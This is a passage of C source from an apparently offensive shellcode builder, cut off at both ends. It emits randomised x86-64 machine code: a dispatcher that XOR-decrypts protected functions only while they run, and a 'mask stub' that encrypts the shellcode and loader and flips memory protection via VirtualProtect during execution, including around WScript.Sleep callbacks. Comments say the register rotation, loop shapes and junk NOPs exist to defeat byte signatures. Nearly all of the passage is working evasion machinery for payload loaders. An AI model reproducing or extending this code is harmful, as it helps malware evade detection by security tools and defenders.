 * through so the XOR loop's terminator/setup/xor opcodes vary with the
 * rotation as well.
 *
 * Per emission we randomize three axes independently:
 *
 *   1. Helper register from the 6-way clobber-safe pool
 *      {rcx, rdx, rbx, rsi, r8, r9}. rbp is excluded, the dispatcher's
 *      NONVOL_REGS push list doesn't save it, so using it would corrupt
 *      the outer caller's rbp on return. rax/rdi/r10-r15 are all live
 *      during the loop.
 *
 *   2. Direction: forward (inc rax) or reverse (dec rax, rax pre-loaded
 *      to base+size-1). XOR is self-inverse per byte so direction is
 *      independent per call, any combo of decrypt/reencrypt directions
 *      still round-trips the region.
 *
 *   3. Shape: how the loop terminates. Both use the same jnz opcode
 *      0x75 as the final byte pair, so the "shape signature" differs
 *      in the 3 bytes immediately preceding it:
 *        - counter-shape: setup `mov helper_d, size_reg_d`; each iter
 *          `dec helper ; jnz`. Helper counts down from size to 0.
 *        - addr-shape:    setup `lea helper, [rax +/- ...]` capturing
 *          end/limit ptr; each iter `cmp rax, helper ; jne`. Loop ends
 *          when rax equals the pre-computed limit.
 *
 *   4. 0..4 bytes of NOP junk via emit_rnd_nop at 4 gap sites inside
 *      the body, 50% skip per gap. 0F 1F /r NOPs don't touch flags so
 *      they are safe between the terminator's flag-setting op and jnz.
 *
 * Post-loop:
 *   rax, helper reg, and flags all clobbered, caller must restore
 *   rax if needed (dispatcher reloads from rdi for loop2).
 */
static uint32_t emit_xor_loop(uint8_t *out, uint8_t size_reg, uint8_t key_reg, const fn_stream_t *st) {
    /* rex_b = REX.B (r/m extension) or REX.R (reg extension), same
       bit numeric value in the REX byte; low3 = 3-bit register field.
       Excludes rbp (5), not in NONVOL_REGS push list. */
    static const struct { uint8_t rex_b; uint8_t low3; } CTR[6] = {
        {0, 1}, /* rcx */
        {0, 2}, /* rdx */
        {0, 3}, /* rbx */
        {0, 6}, /* rsi */
        {1, 0}, /* r8  */
        {1, 1}, /* r9  */
    };
    uint8_t rnd[3], jrnd[4];
    gen_random(rnd, 3);
    gen_random(jrnd, 4);
    uint32_t cidx       = rnd[0] % 6;
    uint32_t tidx       = (cidx + 1 + (rnd[1] >> 1) % 5) % 6;   /* second helper, for the state update */
    int      rev        = st->rev;                              /* fixed: the stream runs one way */
    uint8_t  trex = CTR[tidx].rex_b;
    uint8_t  tlow = CTR[tidx].low3;
    int      addr_shape = rnd[2] & 1;
    uint8_t  crex = CTR[cidx].rex_b;
    uint8_t  clow = CTR[cidx].low3;
    /* size_reg / key_reg are always in r12..r15 range under N>1 dispatch,
       so their REX high bit is always 1. Split into high-bit + low3. */
    uint8_t sz_low3  = size_reg & 7;
    uint8_t key_low3 = key_reg  & 7;

    uint8_t *p    = out;

    /* Setup order matters for addr-shape + reverse: the LEA needs rax
       still at base to capture the correct limit (base - 1), so it
       goes BEFORE the rax reverse setup. */
    if(addr_shape && rev) {
        /* lea helper, [rax - 1]  (limit = base - 1)
           REX: W=1, R=crex; opcode 8D; ModR/M mod=01 reg=clow rm=000; disp8=0xFF */
        *p++ = 0x48 | (crex << 2);
        *p++ = 0x8D;
        *p++ = 0x40 | (clow << 3);
        *p++ = 0xFF;
    }

    /* Reverse rax setup: rax = base + size - 1 (point to last byte). */
    if(rev) {
        /* add rax, size_reg64
           REX: W=1, R=1 (size_reg high), B=0 (rax); opcode 01;
           ModR/M mod=11 reg=sz_low3 rm=000 */
        *p++ = 0x4C;
        *p++ = 0x01;
        *p++ = 0xC0 | (sz_low3 << 3);
        /* dec rax */
        *p++ = 0x48; *p++ = 0xFF; *p++ = 0xC8;
    }

    if(addr_shape && !rev) {
        /* lea helper, [rax + size_reg*1]  (limit = base + size)
           REX: W=1, R=crex, X=1 (size_reg high); opcode 8D;
           ModR/M mod=00 reg=clow rm=100 (SIB); SIB scale=00 idx=sz_low3 base=000 */
        *p++ = 0x48 | (crex << 2) | 0x02;
        *p++ = 0x8D;
        *p++ = 0x04 | (clow << 3);
        *p++ = (sz_low3 << 3);
    }

    if(!addr_shape) {
        /* counter-shape setup: mov helper_d, size_reg_d
           REX: W=0, R=1 (size_reg high), B=crex (helper dst); opcode 89;
           ModR/M mod=11 reg=sz_low3 rm=clow */
        *p++ = 0x44 | crex;
        *p++ = 0x89;
        *p++ = 0xC0 | (sz_low3 << 3) | clow;
    }

    #define XJUNK(i) do { \
        if(jrnd[i] & 1) { \
            uint32_t _len = 1 + ((jrnd[i] >> 1) & 0x03); /* 1..4 */ \
            p += emit_rnd_nop(p, _len); \
        } \
    } while(0)

    XJUNK(0);
    uint8_t *loop_top = p;

    /* xor byte [rax], key_reg_b
       REX: W=0, R=1 (key_reg high); opcode 30; ModR/M mod=00 reg=key_low3 rm=0 */
    *p++ = 0x44;
    *p++ = 0x30;
    *p++ = (key_low3 << 3);

    /* advance the state: key ^= key << a; key ^= key >> b; key ^= key << c */
    for(int s = 0; s < 3; s++) {
        /* mov T_d, key_d   REX: R=1 (key high), B=trex; opcode 89 */
        *p++ = 0x44 | trex;
        *p++ = 0x89;
        *p++ = 0xC0 | (key_low3 << 3) | tlow;
        /* shl/shr T_d, imm8   opcode C1 /4 or /5 */
        if(trex) *p++ = 0x41;
        *p++ = 0xC1;
        *p++ = ((s == 1) ? 0xE8 : 0xE0) | tlow;
        *p++ = st->sh[s];
        /* xor key_d, T_d   REX: R=trex, B=1 (key high); opcode 31 */
        *p++ = 0x41 | (trex << 2);
        *p++ = 0x31;
        *p++ = 0xC0 | (tlow << 3) | key_low3;
    }

    XJUNK(1);

    /* inc/dec rax (64-bit forms only, 32-bit inc eax would zero the
       upper 32 bits of the pointer and break it) */
    *p++ = 0x48; *p++ = 0xFF; *p++ = rev ? 0xC8 : 0xC0;

    XJUNK(2);

    if(addr_shape) {
        /* cmp rax, helper
           REX: W=1, R=crex; opcode 39; ModR/M mod=11 reg=clow rm=0 (rax) */
        *p++ = 0x48 | (crex << 2);
        *p++ = 0x39;
        *p++ = 0xC0 | (clow << 3);
    } else {
        /* dec helper */
        if(crex) *p++ = 0x41;
        *p++ = 0xFF;
        *p++ = 0xC8 | clow;
    }

    XJUNK(3);

    /* jne/jnz rel8 back to loop_top (same opcode 0x75 for both) */
    *p++ = 0x75;
    int32_t disp = (int32_t)(loop_top - (p + 1));
    *p++ = (uint8_t)(int8_t)disp;

    #undef XJUNK
    return (uint32_t)(p - out);
}

/* Emit the dispatcher into `out`. Returns bytes written.
 *   self_off , dispatcher's own blob offset (relative to combined blob start,
 *               which is where LEA rip+disp arithmetic will land)
 *   loader_off , loader region's blob offset (= shim_padded_size)
 *   ft_off     , fn_table_area's blob offset (marker-relative, inside shim)
 *
 * ABI on entry (from thunk tail-jmp):
 *   r10 = target_blob_off (loader-blob-relative callee entry point)
 *   r11 = callee_id (index into fn_table)
 *   rcx/rdx/r8/r9 = callee's args (must reach callee untouched)
 *   [rsp] = caller's post-CALL return address
 *
 * Frame layout after prologue (rsp-relative):
 *   [+0x00..+0x1F] shadow space for the callee we CALL
 *   [+0x20..+0x3F] copies of the caller's stack args 5..8, so the callee
 *                  finds them where the Win64 ABI puts them
 *   [+0x40..+0x47] spilled rcx
 *   [+0x48..+0x4F] spilled rdx
 *   [+0x50..+0x57] spilled r8
 *   [+0x58..+0x5F] spilled r9
 *   [+0x60..+0x67] rax save (callee's return value across re-encrypt)
 *   [+0x68..+0x6F] pad
 *
 * Protected functions may take at most DISPATCH_MAX_ARGS (8) arguments.
 */
#define DISPATCH_FRAME      0x70u
#define DISPATCH_MAX_ARGS   8
static uint32_t emit_dispatcher(uint8_t *out,
                                uint32_t self_off,
                                uint32_t loader_off,
                                uint32_t ft_off,
                                int      input_swap,
                                const fn_stream_t *st)
{
    uint8_t *p = out;
    /* input_swap agrees with emit_thunk on which volatile scratch reg
       carries which value:
         swap==0: r10=target_off, r11=callee_id
         swap==1: r11=target_off, r10=callee_id
       Two dispatcher instructions below (`mov PTR_d, id_reg_d` and
       `add rax, target_reg`) pick their source reg based on this. */
    uint8_t id_src_low3     = input_swap ? 2 : 3;  /* r10 low3 : r11 low3 */
    uint8_t target_src_low3 = input_swap ? 3 : 2;
    #define D_OFF() ((uint32_t)(p - out))
    #define RIP_DISP32(target_off) do { \
        int32_t _d = (int32_t)(target_off) - (int32_t)(self_off + D_OFF() + 4); \
        memcpy(p, &_d, 4); p += 4; \
    } while(0)

    /* --- State-register role rotation. Randomly permute 4 roles across
       {r12, r13, r14, r15} per build. Every ModR/M byte referencing
       these regs varies per build (24 permutations = ~4.6 bits of
       entropy on top of everything else). Roles:
         PTR: fn_entry ptr, later loader_base, 64-bit
         OFF: fn_entry.offset, u32 (upper 32 zeroed by mov r32)
         SZ:  fn_entry.size  , u32
         KEY: keystream state, u32 (seed from fn_entry)
       emit_xor_loop is passed SZ and KEY so the XOR-loop opcodes vary
       with the rotation as well. */
    static const uint8_t STATE_REGS[4] = {12, 13, 14, 15};
    uint8_t roles[4];
    memcpy(roles, STATE_REGS, 4);
    {
        uint8_t rnd_bytes[4];
        gen_random(rnd_bytes, 4);
        for(int i = 3; i > 0; i--) {
            int j = rnd_bytes[i] % (i + 1);
            uint8_t t = roles[i];
            roles[i] = roles[j];
            roles[j] = t;
        }
    }
    uint8_t PTR      = roles[0];
    uint8_t OFF      = roles[1];
    uint8_t SZ       = roles[2];
    uint8_t KEY      = roles[3];
    uint8_t PTR_low3 = PTR & 7;
    uint8_t OFF_low3 = OFF & 7;

    /* --- Prologue: save the 7 nonvolatiles we clobber, in random
     * order per build. Pop order in the epilogue mirrors this array
     * in reverse. Reg ids: 3=rbx, 6=rsi, 7=rdi, 12=r12, 13=r13,
     * 14=r14, 15=r15. Total push bytes = 3*1 + 4*2 = 11 regardless
     * of order, so frame layout after `sub rsp, 0x70` is unchanged.
     * RSP: 8 mod 16 on entry (from CALL), 7 pushes → 0 mod 16. */
    static const uint8_t NONVOL_REGS[7] = {3, 6, 7, 12, 13, 14, 15};
    uint8_t save_order[7];
    memcpy(save_order, NONVOL_REGS, 7);
    {
        uint8_t rnd_bytes[7];
        gen_random(rnd_bytes, 7);
        for(int i = 6; i > 0; i--) {
            int j = rnd_bytes[i] % (i + 1);
            uint8_t t = save_order[i];
            save_order[i] = save_order[j];
            save_order[j] = t;
        }
    }
    /* 50% chance of no junk at a given gap, else 1..4 bytes emitted via
       emit_rnd_nop (0F 1F /r NOP family with random disp bytes). Safe
       between any two consecutive PUSH or POP instructions, the CPU
       decodes NOP r/m for length only, never touches memory. RIP-rel
       disps computed by RIP_DISP32 self-correct: they use D_OFF() at
       emission time so earlier junk only shrinks the emitted disp. */
    #define EMIT_JUNK() do { \
        uint8_t _r; gen_random(&_r, 1); \
        if(_r & 1) { \
            uint32_t _len = 1 + ((_r >> 1) & 0x03); /* 1..4 bytes */ \
            p += emit_rnd_nop(p, _len); \
        } \
    } while(0)

    for(int i = 0; i < 7; i++) {
        uint8_t r = save_order[i];
        if(r < 8) {
            *p++ = 0x50 + r;              /* push r        (low-8)  */
        } else {
            *p++ = 0x41; *p++ = 0x50 + (r - 8); /* push r  (high-8)  */
        }
        if(i < 6) EMIT_JUNK();  /* gap between consecutive pushes */
    }

    *p++ = 0x48; *p++ = 0x83; *p++ = 0xEC; *p++ = (uint8_t)DISPATCH_FRAME;  /* sub rsp, 0x70 */

    /* --- Spill arg regs into frame --- */
    /* EMIT_JUNK() between spills breaks the 20-byte block of 4
       identical-shape `mov [rsp+X], reg` instructions. NOPs from
       0F 1F /r don't touch flags, don't reference memory, and are
       safe between any mov/mov, mov/lea, add/mov, or mov/call pair
       in this middle section. */
    *p++ = 0x48; *p++ = 0x89; *p++ = 0x4C; *p++ = 0x24; *p++ = 0x40; /* mov [rsp+0x40], rcx */
    EMIT_JUNK();
    *p++ = 0x48; *p++ = 0x89; *p++ = 0x54; *p++ = 0x24; *p++ = 0x48; /* mov [rsp+0x48], rdx */
    EMIT_JUNK();
    *p++ = 0x4C; *p++ = 0x89; *p++ = 0x44; *p++ = 0x24; *p++ = 0x50; /* mov [rsp+0x50], r8  */
    EMIT_JUNK();
    *p++ = 0x4C; *p++ = 0x89; *p++ = 0x4C; *p++ = 0x24; *p++ = 0x58; /* mov [rsp+0x58], r9  */

    /* --- Forward stack args 5..8 into the callee's outgoing-arg slots.
       At entry the caller's 5th arg is at [rsp_entry+0x28]; after 7 pushes
       and the frame that is [rsp + FRAME + 0x38 + 0x28]. rax is free here. */
    for(int a = 0; a < DISPATCH_MAX_ARGS - 4; a++) {
        uint32_t src = DISPATCH_FRAME + 0x38u + 0x28u + (uint32_t)a * 8u;
        *p++ = 0x48; *p++ = 0x8B; *p++ = 0x84; *p++ = 0x24;       /* mov rax, [rsp+src] */
        memcpy(p, &src, 4); p += 4;
        *p++ = 0x48; *p++ = 0x89; *p++ = 0x44; *p++ = 0x24;       /* mov [rsp+0x20+a*8], rax */
        *p++ = (uint8_t)(0x20 + a * 8);
    }

    /* --- Locate fn_table entry: rsi = &fn_table_area[16 + id*12] --- */
    *p++ = 0x48; *p++ = 0x8D; *p++ = 0x35;          /* lea rsi, [rip+ft_disp] */
    RIP_DISP32(ft_off);
    *p++ = 0x48; *p++ = 0x83; *p++ = 0xC6; *p++ = 0x10;  /* add rsi, 16 (skip marker+count+pad) */

    EMIT_JUNK();
    /* mov PTR_d, <id_src>_d  (callee_id → PTR).
       REX: W=0, R=1 (id_src high), B=1 (PTR high) */
    *p++ = 0x45;
    *p++ = 0x89;
    *p++ = 0xC0 | (id_src_low3 << 3) | PTR_low3;
    EMIT_JUNK();
    /* imul PTR, PTR, 12  (entry size). REX: W=1, R=1, B=1 */
    *p++ = 0x4D;
    *p++ = 0x6B;
    *p++ = 0xC0 | (PTR_low3 << 3) | PTR_low3;
    *p++ = 0x0C;
    EMIT_JUNK();
    /* add PTR, rsi  (PTR = &entries[id]).
       opcode 01; REX: W=1, R=0 (rsi low), B=1 (PTR high);
       ModR/M mod=11 reg=6 (rsi low3) rm=PTR_low3 */
    *p++ = 0x49;
    *p++ = 0x01;
    *p++ = 0xC0 | (6 << 3) | PTR_low3;

    /* --- Load fn_entry fields into nonvolatile regs --- */
    EMIT_JUNK();
    p += emit_mov_r32_at_ptr(p, OFF, PTR, 0);   /* mov OFF_d, [PTR+0]      (offset) */
    EMIT_JUNK();
    p += emit_mov_r32_at_ptr(p, SZ,  PTR, 4);   /* mov SZ_d,  [PTR+4]      (size)   */
    EMIT_JUNK();
    p += emit_mov_r32_at_ptr(p, KEY, PTR, 8);   /* mov KEY_d, [PTR+8]      (seed)   */

    /* --- Compute loader_base into PTR (reuse, done with fn_entry ptr) --- */
    EMIT_JUNK();
    *p++ = 0x48; *p++ = 0x8D; *p++ = 0x05;          /* lea rax, [rip+lb_disp] */
    RIP_DISP32(loader_off);
    /* mov PTR, rax  (PTR = loader_base).
       opcode 89 (mov r/m64, r64); reg=src=rax (0), rm=dst=PTR.
       REX: W=1, R=0 (rax low), B=1 (PTR high) */
    *p++ = 0x49;
    *p++ = 0x89;
    *p++ = 0xC0 | (0 << 3) | PTR_low3;

    /* --- XOR-decrypt callee region: rdi = base = loader_base + OFF --- */
    EMIT_JUNK();
    /* add rax, OFF  (loader_base + offset).
       opcode 01; REX: W=1, R=1 (OFF high), B=0 (rax low);
       ModR/M mod=11 reg=OFF_low3 rm=0 (rax) */
    *p++ = 0x4C;
    *p++ = 0x01;
    *p++ = 0xC0 | (OFF_low3 << 3);
    /* OFF is 32-bit clean (upper zeroed by earlier mov r32). Adding a full
       64-bit reg is fine, high 32 bits are 0. */
    *p++ = 0x48; *p++ = 0x89; *p++ = 0xC7;          /* mov rdi, rax (save decrypt base) */

    /* The loop advances KEY; OFF is no longer needed and keeps the seed
       across the call for the second loop.  mov OFF_d, KEY_d */
    *p++ = 0x45; *p++ = 0x89; *p++ = 0xC0 | ((KEY & 7) << 3) | OFF_low3;

    /* XOR-decrypt: randomized helpers, shape, and body junk.
       size_reg=SZ, key_reg=KEY driven by the role rotation. */
    p += emit_xor_loop(p, SZ, KEY, st);

    /* --- Restore args and call callee at loader_base + r10 --- */
    *p++ = 0x48; *p++ = 0x8B; *p++ = 0x4C; *p++ = 0x24; *p++ = 0x40; /* mov rcx, [rsp+0x40] */
    EMIT_JUNK();
    *p++ = 0x48; *p++ = 0x8B; *p++ = 0x54; *p++ = 0x24; *p++ = 0x48; /* mov rdx, [rsp+0x48] */
    EMIT_JUNK();
    *p++ = 0x4C; *p++ = 0x8B; *p++ = 0x44; *p++ = 0x24; *p++ = 0x50; /* mov r8,  [rsp+0x50] */
    EMIT_JUNK();
    *p++ = 0x4C; *p++ = 0x8B; *p++ = 0x4C; *p++ = 0x24; *p++ = 0x58; /* mov r9,  [rsp+0x58] */

    /* Compute callee entry: rax = loader_base + target_reg (r10 or r11) */
    EMIT_JUNK();
    /* mov rax, PTR (PTR = loader_base).
       opcode 89; reg=src=PTR, rm=dst=rax (0).
       REX: W=1, R=1 (PTR high), B=0 (rax low) */
    *p++ = 0x4C;
    *p++ = 0x89;
    *p++ = 0xC0 | (PTR_low3 << 3);
    EMIT_JUNK();
    /* add rax, <target_reg>.
       opcode 01; reg=target_src, rm=rax (0).
       REX: W=1, R=1 (target high), B=0 (rax low) */
    *p++ = 0x4C;
    *p++ = 0x01;
    *p++ = 0xC0 | (target_src_low3 << 3);
    EMIT_JUNK();
    *p++ = 0xFF; *p++ = 0xD0;                       /* call rax */

    /* Save return value */
    *p++ = 0x48; *p++ = 0x89; *p++ = 0x44; *p++ = 0x24; *p++ = 0x60; /* mov [rsp+0x60], rax */

    /* --- XOR-re-encrypt callee region using saved base (rdi) --- */
    *p++ = 0x48; *p++ = 0x89; *p++ = 0xF8;          /* mov rax, rdi */

    *p++ = 0x45; *p++ = 0x89; *p++ = 0xC0 | (OFF_low3 << 3) | (KEY & 7);   /* mov KEY_d, OFF_d (seed) */

    /* Independent roll of helpers, shape, and junk from loop1;
       same size_reg/key_reg driven by the role rotation. */
    p += emit_xor_loop(p, SZ, KEY, st);

    /* Restore rax (callee's return value) */
    *p++ = 0x48; *p++ = 0x8B; *p++ = 0x44; *p++ = 0x24; *p++ = 0x60; /* mov rax, [rsp+0x60] */

    /* --- Epilogue: pop in reverse of the prologue's save_order --- */
    *p++ = 0x48; *p++ = 0x83; *p++ = 0xC4; *p++ = (uint8_t)DISPATCH_FRAME; /* add rsp, 0x70 */
    for(int i = 6; i >= 0; i--) {
        uint8_t r = save_order[i];
        if(r < 8) {
            *p++ = 0x58 + r;              /* pop r         (low-8)  */
        } else {
            *p++ = 0x41; *p++ = 0x58 + (r - 8); /* pop r   (high-8)  */
        }
        if(i > 0) EMIT_JUNK();  /* gap between consecutive pops */
    }
    *p++ = 0xC3;                                     /* ret     */
    #undef EMIT_JUNK

    #undef D_OFF
    #undef RIP_DISP32
    return (uint32_t)(p - out);
}

/* Upper bound for the emitted dispatcher (used to reserve buffer
   space). Worst case is about 480 bytes with every junk gap taken. */
/* shift triples with the full period of 2^32-1 (checked exhaustively) */
static const uint8_t XS_TRIPLES[36][3] = {
    {1,3,10},{1,5,16},{1,5,19},{1,9,29},{1,11,6},{1,11,16},{1,19,3},{1,21,20},{1,27,27},
    {2,5,15},{2,5,21},{2,7,7},{2,7,9},{2,7,25},{2,9,15},{2,15,17},{2,15,25},{2,21,9},
    {3,1,14},{3,3,26},{3,3,28},{3,3,29},{3,5,20},{3,5,22},{3,5,25},{3,7,29},{3,13,7},
    {5,13,6},{5,17,13},{6,21,7},{7,1,9},{13,17,5},{13,17,15},{9,11,19},{11,21,13},{5,9,7}};

/* ---- mask stub -------------------------------------------------------
 * One page at the very end of the shellcode. While the payload runs it is
 * the only executable page: everything from the shim up to it is XORed
 * with a dword keystream and made read/write.
 *
 *   call entry: forwards to slot TARGET with the caller's arguments and
 *               stack untouched; masks before, unmasks when it returns.
 *   exit entry: stands in for the shim's exit hook, which is masked. The
 *               entering thread unmasks and goes on to the hook, any other
 *               thread goes to slot THREAD.
 *   inbound thunks: one per loader function that outside code calls while
 *               the loader is masked (the script host's methods). Unmasks,
 *               forwards with arguments and stack untouched, masks again
 *               when the function returns. Passes straight through when
 *               the loader is not masked.
 *
 * Return addresses go on a small stack in the slots, so a masked call made
 * from inside an inbound call (WScript.Sleep) nests.
 *
 * The loader fills the slots at the start of the page (FRITTER_MASK_*).
 * Registers, shift triple, seed, junk and block positions are drawn per
 * output. */
#define MASK_PAGE       4096u
#define MASK_STUB_BUILT (LOADER_PEB1_FN_COUNT > 1 && LOADER_PEB2_FN_COUNT > 1)

/* op reg, [rip -> page+to]; `trail` = immediate bytes that follow */
static uint8_t *mk_rip(uint8_t *p, const uint8_t *pg, int w, uint8_t op, uint8_t reg,
                       int32_t to, int trail) {
    uint8_t rex = (uint8_t)((w ? 8 : 0) | ((reg >> 3) << 2));
    int32_t d;
    if(rex) *p++ = 0x40 | rex;
    *p++ = op;
    *p++ = 0x05 | ((reg & 7) << 3);
    d = to - (int32_t)((p + 4 + trail) - pg);
    memcpy(p, &d, 4);
    return p + 4;
}

/* 32-bit op dst, src (register form) */
static uint8_t *mk_r32(uint8_t *p, uint8_t op, uint8_t dst, uint8_t src) {
    uint8_t rex = (uint8_t)(((src >> 3) << 2) | (dst >> 3));
    if(rex) *p++ = 0x40 | rex;
    *p++ = op;
    *p++ = 0xC0 | ((src & 7) << 3) | (dst & 7);
    return p;
}

/* VirtualProtect(...) with [rsp+0x20] as the old-protection slot.
 * kind 0: loader range -> RW, 1: this page -> RX, 2: both -> RWX */
static uint8_t *mk_vp(uint8_t *p, const uint8_t *pg, int kind, uint8_t r) {
    static const uint8_t prot[3] = {0x04, 0x20, 0x40};
    int i;
    for(i = 0; i < 4; i++) {
      switch((i + r) & 3) {
        case 0:
          if(kind == 1) p = mk_rip(p, pg, 1, 0x8D, 1, 0, 0);                        // lea rcx, [page]
          else          p = mk_rip(p, pg, 1, 0x8B, 1, FRITTER_MASK_PBASE * 8, 0);  // mov rcx, [pbase]
          break;
        case 1:
          if(kind == 1) { *p++ = 0xBA; *p++ = 0; *p++ = 0x10; *p++ = 0; *p++ = 0; }  // mov edx, 0x1000
          else {
            p = mk_rip(p, pg, 1, 0x8B, 2, FRITTER_MASK_PLEN * 8, 0);                // mov rdx, [plen]
            if(kind == 2) { *p++ = 0x48; *p++ = 0x81; *p++ = 0xC2;                   // add rdx, 0x1000
                            *p++ = 0; *p++ = 0x10; *p++ = 0; *p++ = 0; }
          }
          break;
        case 2:
          *p++ = 0x41; *p++ = 0xB8; *p++ = prot[kind]; *p++ = 0; *p++ = 0; *p++ = 0; // mov r8d, prot
          break;
        default:
          *p++ = 0x4C; *p++ = 0x8D; *p++ = 0x4C; *p++ = 0x24; *p++ = 0x20;           // lea r9, [rsp+0x20]
          break;
      }
      if((r >> (4 + i)) & 1) p += emit_rnd_nop(p, 1 + ((r >> (i + 1)) & 3));
    }
    return mk_rip(p, pg, 0, 0xFF, 2, FRITTER_MASK_VP * 8, 0);                        // call [vp]
}

/* Fill the page `pg`; the masked range is the mask_len bytes before it. */
static int emit_mask_page(uint8_t *pg, uint32_t mask_len) {
    uint8_t  rnd[64], reg[7] = {0, 1, 2, 8, 9, 10, 11}, ar[4] = {1, 2, 8, 9}, t;
    uint8_t  *p, *crypt, *xloop, *unmask, *back, *inback, *incommon, *loop, *jne, *je, P, C, K, T;
    uint32_t tbase;
    const uint8_t *sh;
    uint32_t seed, seed2, cnt = mask_len / 4, n = 0, i, j;
    uint16_t off;
    int32_t  d;
    int      blk, first;

    if(!gen_random(pg, MASK_PAGE) || !gen_random(rnd, sizeof(rnd))) return 0;
    do { if(!gen_random(&seed, 4) || !gen_random(&seed2, 4)) return 0; } while(seed == 0 || seed2 == 0);
    #define RB   (rnd[n++ % sizeof(rnd)])
    #define JK   do { uint8_t j_ = RB; if(j_ & 1) p += emit_rnd_nop(p, 1 + ((j_ >> 1) & 7)); } while(0)
    #define SLOT(k) ((int32_t)((k) * 8))
    #define ARGSLOT(r_) SLOT(FRITTER_MASK_ARGS + ((r_) == 1 ? 0 : (r_) == 2 ? 1 : (r_) == 8 ? 2 : 3))
    for(i = 6; i > 0; i--) { j = RB % (i + 1); t = reg[i]; reg[i] = reg[j]; reg[j] = t; }
    P = reg[0]; C = reg[1]; K = reg[2]; T = reg[3];
    sh = XS_TRIPLES[RB % 36];

    /* state the stub reads before anything writes it */
    memset(pg + SLOT(FRITTER_MASK_FLAG), 0, 8);
    memset(pg + SLOT(FRITTER_MASK_SP),   0, 8);
    memset(pg + SLOT(FRITTER_MASK_NIN),  0, 8);
    /* push rax / pop to jmp on the return stack; r10 and r11 are free at every use */
    #define STK_PUSH_RAX do { \
        p = mk_rip(p, pg, 1, 0x8B, 11, SLOT(FRITTER_MASK_SP), 0);         /* mov r11, [sp]         */ \
        p = mk_rip(p, pg, 1, 0x8D, 10, SLOT(FRITTER_MASK_STK), 0);        /* lea r10, [stk]        */ \
        *p++ = 0x4B; *p++ = 0x89; *p++ = 0x04; *p++ = 0xDA;               /* mov [r10+r11*8], rax  */ \
        p = mk_rip(p, pg, 1, 0xFF, 0, SLOT(FRITTER_MASK_SP), 0);          /* inc qword [sp]        */ \
      } while(0)
    #define STK_POP_R10R11 do { \
        p = mk_rip(p, pg, 1, 0xFF, 1, SLOT(FRITTER_MASK_SP), 0);          /* dec qword [sp]        */ \
        p = mk_rip(p, pg, 1, 0x8B, 11, SLOT(FRITTER_MASK_SP), 0);         /* mov r11, [sp]         */ \
        p = mk_rip(p, pg, 1, 0x8D, 10, SLOT(FRITTER_MASK_STK), 0);        /* lea r10, [stk]        */ \
      } while(0)

    p = pg + FRITTER_MASK_SLOTS * 8 + (RB & 0x3F);

    /* xloop: XOR C dwords at P with the keystream from state K (self-inverse) */
    xloop = p;
    loop = p;
    t = (uint8_t)(((K >> 3) << 2) | (P >> 3));
    if(t) *p++ = 0x40 | t;
    *p++ = 0x31; *p++ = ((K & 7) << 3) | (P & 7);                         // xor [P], K
    for(i = 0; i < 3; i++) {
      p = mk_r32(p, 0x89, T, K);                                          // mov T, K
      if(T >> 3) *p++ = 0x41;
      *p++ = 0xC1; *p++ = ((i == 1) ? 0xE8 : 0xE0) | (T & 7); *p++ = sh[i]; // shl/shr T, n
      p = mk_r32(p, 0x31, K, T);                                          // xor K, T
    }
    JK;
    *p++ = 0x48 | (P >> 3); *p++ = 0x83; *p++ = 0xC0 | (P & 7); *p++ = 4; // add P, 4
    if(C >> 3) *p++ = 0x41;
    *p++ = 0xFF; *p++ = 0xC8 | (C & 7);                                   // dec C
    *p++ = 0x75; *p = (uint8_t)(loop - (p + 1)); p++;                     // jnz loop
    *p++ = 0xC3;
    p += RB & 0x1F;

    /* crypt: the shim and loader, then the instance copy */
    crypt = p;
    p = mk_rip(p, pg, 1, 0x8D, P, -(int32_t)mask_len, 0);                 // lea P, [first masked byte]
    JK;
    if(C >> 3) *p++ = 0x41;
    *p++ = 0xB8 | (C & 7); memcpy(p, &cnt, 4); p += 4;                    // mov C, dwords
    if(K >> 3) *p++ = 0x41;
    *p++ = 0xB8 | (K & 7); memcpy(p, &seed, 4); p += 4;                   // mov K, seed
    d = (int32_t)(xloop - (p + 5));
    *p++ = 0xE8; memcpy(p, &d, 4); p += 4;                                // call xloop
    JK;
    p = mk_rip(p, pg, 1, 0x8B, P, SLOT(FRITTER_MASK_IBASE), 0);           // mov P, [ibase]
    p = mk_rip(p, pg, 0, 0x8B, C, SLOT(FRITTER_MASK_ICNT), 0);            // mov C, [icnt]
    p = mk_r32(p, 0x85, C, C);                                            // test C, C
    *p++ = 0x74; je = p++;                                                // jz done
    if(K >> 3) *p++ = 0x41;
    *p++ = 0xB8 | (K & 7); memcpy(p, &seed2, 4); p += 4;                  // mov K, seed2
    d = (int32_t)(xloop - (p + 5));
    *p++ = 0xE9; memcpy(p, &d, 4); p += 4;                                // jmp xloop
    *je = (uint8_t)(p - (je + 1));
    *p++ = 0xC3;                                                          // done: ret
    p += RB & 0x1F;

    /* unmask: everything back to RWX, then decrypt */
    unmask = p;
    *p++ = 0x48; *p++ = 0x83; *p++ = 0xEC; *p++ = 0x28;                   // sub rsp, 0x28
    p = mk_vp(p, pg, 2, RB);
    *p++ = 0x48; *p++ = 0x83; *p++ = 0xC4; *p++ = 0x28;                   // add rsp, 0x28
    JK;
    p = mk_rip(p, pg, 0, 0xC7, 0, SLOT(FRITTER_MASK_FLAG), 4);            // mov dword [flag], 0
    memset(p, 0, 4); p += 4;
    d = (int32_t)(crypt - (p + 5));
    *p++ = 0xE9; memcpy(p, &d, 4); p += 4;                                // jmp crypt
    p += RB & 0x1F;

    /* where the forwarded call returns to */
    back = p;
    *p++ = 0x50;                                                          // push rax
    *p++ = 0x48; *p++ = 0x83; *p++ = 0xEC; *p++ = 0x28;
    d = (int32_t)(unmask - (p + 5));
    *p++ = 0xE8; memcpy(p, &d, 4); p += 4;                                // call unmask
    *p++ = 0x48; *p++ = 0x83; *p++ = 0xC4; *p++ = 0x28;
    *p++ = 0x58;                                                          // pop rax
    JK;
    STK_POP_R10R11;
    *p++ = 0x43; *p++ = 0xFF; *p++ = 0x24; *p++ = 0xDA;                   // jmp [r10+r11*8]
    p += RB & 0x1F;

    /* where an inbound call returns to: mask again, go back to the caller */
    inback = p;
    *p++ = 0x50;                                                          // push rax
    *p++ = 0x48; *p++ = 0x83; *p++ = 0xEC; *p++ = 0x28;
    STK_POP_R10R11;
    *p++ = 0x4B; *p++ = 0x8B; *p++ = 0x04; *p++ = 0xDA;                   // mov rax, [r10+r11*8]
    p = mk_rip(p, pg, 1, 0x89, 0, SLOT(FRITTER_MASK_IRET), 0);            // mov [iret], rax
    JK;
    d = (int32_t)(crypt - (p + 5));
    *p++ = 0xE8; memcpy(p, &d, 4); p += 4;                                // call crypt
